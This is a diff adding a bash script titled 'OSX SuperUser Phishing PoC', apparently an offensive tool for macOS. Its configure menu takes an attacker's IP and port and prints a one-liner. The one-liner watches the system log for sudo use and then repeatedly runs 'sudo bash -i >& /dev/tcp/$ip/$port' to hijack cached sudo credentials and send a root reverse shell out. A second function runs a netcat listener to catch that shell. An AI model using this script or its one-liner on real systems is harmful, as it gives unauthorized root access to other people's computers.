@@ -1,0 +1,58 @@
+#!/bin/bash
+author=psychokiller
+bpver=1.0
+#Props to Seb from hak5 - I`m bash n00b so some of the interface is based on Sebkinne's wp6.sh
+#Artwork - http://chris.com/ascii/index.php?art=animals/other%20%28water%29
+#Idea - Someone on apple forums posted a similar but broken PoC - found this after googling for information on this topic: https://discussions.apple.com/thread/7621223?start=0&tstart=0
+echo "                                  /^^^/           /]  ";
+echo "                                 /   ]           / ]  ";
+echo "      O                  _______/    ]___       /  ]  ";
+echo "                        /                \_____/   /  ";
+echo "   O                  _/   [@]  \ \  AUTHLESS SUDO \  ";
+echo "           ___//_    /..         | | FOR ALL PID    ] ";
+echo "    o     /o )osx\/   VVVvvv\    | |         _/\    ] ";
+echo "      O   )___\\_/\         |               /    \  ] ";
+echo "                     AAA^^^^^              /       \] ";
+echo "                      \_________\   \_____/           ";
+echo "                               \    \                 ";
+echo "                                 \____\               ";
+echo "                                                      ";
+echo "    ▄▄▄▄· ▪   ▄▄ •      ▄▄▄· ▄ .▄▪  .▄▄ ·  ▄ .▄  ";
+echo "    ▐█ ▀█▪██ ▐█ ▀ ▪    ▐█ ▄███▪▐███ ▐█ ▀. ██▪▐█  ";
+echo "    ▐█▀▀█▄▐█·▄█ ▀█▄     ██▀·██▀▐█▐█·▄▀▀▀█▄██▀▐█  ";
+echo "    ██▄▪▐█▐█▌▐█▄▪▐█    ▐█▪·•██▌▐▀▐█▌▐█▄▪▐███▌▐▀  ";
+echo "    ·▀▀▀▀ ▀▀▀·▀▀▀▀     .▀   ▀▀▀ ·▀▀▀ ▀▀▀▀ ▀▀▀ ·  ";
+echo "    [|] OSX SuperUser Phishing PoC ";
+echo "    [|] Author - $author ";
+echo "    [|] version $(tput bold)$bpver$(tput sgr0) ";
+function menu {
+    printf "    [$(tput bold)C$(tput sgr0)]onfigure exploit (reverse root shells, goofs, etc)\n\
+    [$(tput bold)M$(tput sgr0)]anage shell\n\
+    [$(tput bold)Q$(tput sgr0)]uit\n\n    "
+    read -r -sn1 key
+    case "$key" in
+            [cC]) configure;;
+            [mM]) manageshell;;
+            [qQ]) printf "\n"; exit;;
+    esac
+}
+
+function configure {
+  printf "enter an ip for the reverse shell: "
+  read ip
+  printf "    enter a port to listen for the shell on: "
+  read port
+  echo "    $(tput bold)exploit$(tput sgr0): tail -F -n 0 /var/log/system.log | grep --line-buffered sudo | while read ; do while true; do sudo bash -i >& /dev/tcp/$ip/$port 0>&1; done; done"
+  echo ""
+  menu
+}
+
+function manageshell {
+   printf "port assinged for shell: "
+   read port
+   echo "   $(tput bold) [SHELL] $(tput sgr0)"
+   nc -l $port
+}
+
+
+menu
